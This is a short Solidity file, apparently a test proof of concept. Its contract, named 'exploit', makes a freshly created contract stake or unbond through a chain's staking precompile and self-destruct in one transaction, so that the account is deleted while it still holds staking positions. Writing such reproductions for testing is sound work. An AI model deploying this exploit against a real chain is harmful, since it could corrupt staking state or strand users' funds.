// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./StakingI.sol";

// Created, staked as itself and self-destructed in one tx, so EIP-6780 deletes
// it and x/vm DeleteAccount runs while it holds staking positions.
contract DelegatingKillable {
    constructor() payable {}

    function stakeAndKill(
        string memory validator,
        uint256 amount,
        bool undelegate
    ) external {
        STAKING_CONTRACT.delegate(address(this), validator, amount);
        if (undelegate) {
            // trades the delegation for an unbonding delegation
            STAKING_CONTRACT.undelegate(address(this), validator, amount);
        }
        selfdestruct(payable(msg.sender));
    }
}

contract StakingSelfdestruct {
    function exploit(
        string memory validator,
        uint256 amount,
        bool undelegate
    ) external payable {
        new DelegatingKillable{value: msg.value}().stakeAndKill(
            validator,
            amount,
            undelegate
        );
    }
}
